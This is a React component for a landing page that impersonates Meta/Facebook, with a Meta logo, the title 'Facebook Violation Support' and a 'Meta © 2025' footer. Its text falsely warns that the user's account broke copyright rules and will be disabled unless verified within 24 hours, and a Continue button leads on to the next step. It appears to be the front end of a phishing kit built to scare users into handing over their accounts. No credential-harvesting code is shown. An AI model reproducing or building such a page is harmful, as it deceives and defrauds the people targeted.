import React, { useState, useEffect } from "react";

function LandingPage({ onGetStarted }) {
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);

  useEffect(() => {
    const handleResize = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  return (
    <div
      style={{
        background:
          "linear-gradient(130deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%)",
        fontFamily: "Helvetica",
        WebkitFontSmoothing: "antialiased",
        minHeight: "100vh",
        padding: "20px",
        height: "100vh",
        overflow: "hidden",
        overflowY: "scroll",
      }}
    >
      <div
        style={{ marginBottom: "3rem", padding: "20px", minHeight: "100vh" }}
      >
        <div
          style={{
            maxWidth: "600px",
            margin: isMobile ? "10px auto 0" : "20px auto 0",
            backgroundColor: "#fff",
            padding: isMobile ? "20px" : "30px",
            borderRadius: "8px",
            boxShadow: "0 2px 4px rgba(0,0,0,0.1)",
            width: isMobile ? "calc(100% - 20px)" : "auto",
          }}
        >
          <h3
            style={{
              fontFamily:
                'system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif',
              fontSize: window.innerWidth <= 768 ? "18px" : "20px",
              fontWeight: "bold",
              color: "#000",
              marginBottom: "20px",
              lineHeight: "1.2rem",
            }}
          >
            Account will be deactivated
          </h3>

          <div
            style={{
              fontFamily: "Helvetica, Arial, sans-serif",
              fontSize: "14px",
              lineHeight: "1.4rem",
              color: "#141823",
              marginBottom: "20px",
            }}
          >
            Your account or the page you use has violated copyright. We will
            immediately limit your account or permanently disable it for
            non-compliance with our terms of service.
          </div>

          <div
            style={{
              fontFamily: "Helvetica, Arial, sans-serif",
              fontSize: "14px",
              lineHeight: "1.4rem",
              color: "#141823",
              marginBottom: "30px",
            }}
          >
            If you think we've accidentally suspended your account, you have 24
            hours to verify your account. If you miss this security
            notification, your account will be permanently disabled.
          </div>

          <div
            style={{
              marginBottom: "30px",
              padding: "15px",
              borderRadius: "8px",
              backgroundColor: "#f8f9fa",
              border: "1px solid #e3e6ea",
            }}
          >
            <table style={{ borderCollapse: "collapse", width: "100%" }}>
              <tbody>
                <tr>
                  <td style={{ verticalAlign: "top", width: "70px" }}>
                    <img
                      width="64"
                      height="64"
                      src="https://registry.npmmirror.com/@lobehub/icons-static-png/latest/files/dark/meta-color.png"
                      alt="Facebook Help"
                      style={{ display: "block", borderRadius: "8px" }}
                    />
                  </td>
                  <td style={{ verticalAlign: "center", paddingLeft: "15px" }}>
                    <div
                      style={{
                        fontFamily: "Helvetica, Arial, sans-serif",
                        fontSize: "22px",
                        marginBottom: "5px",
                        color: "#000000e0",
                        fontWeight: "bold",
                        lineHeight: "1.2rem",
                      }}
                    >
                      Facebook Violation Support
                    </div>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>

          <button
            onClick={onGetStarted}
            style={{
              backgroundColor: "#1876F2",
              color: "white",
              border: "none",
              borderRadius: "6px",
              padding: "12px 24px",
              fontSize: "16px",
              fontWeight: "600",
              cursor: "pointer",
              width: "100%",
              marginBottom: "30px",
              transition: "background-color 0.2s",
            }}
            onMouseOver={(e) => (e.target.style.backgroundColor = "#166fe5")}
            onMouseOut={(e) => (e.target.style.backgroundColor = "#1876F2")}
          >
            Continue
          </button>

          <div
            style={{
              fontFamily: "Helvetica, Arial, sans-serif",
              fontSize: "11px",
              lineHeight: "21px",
              color: "#737373",
              fontWeight: "600",
              textAlign: "center",
            }}
          >
            Meta © 2025
          </div>
        </div>
      </div>
    </div>
  );
}

export default LandingPage;
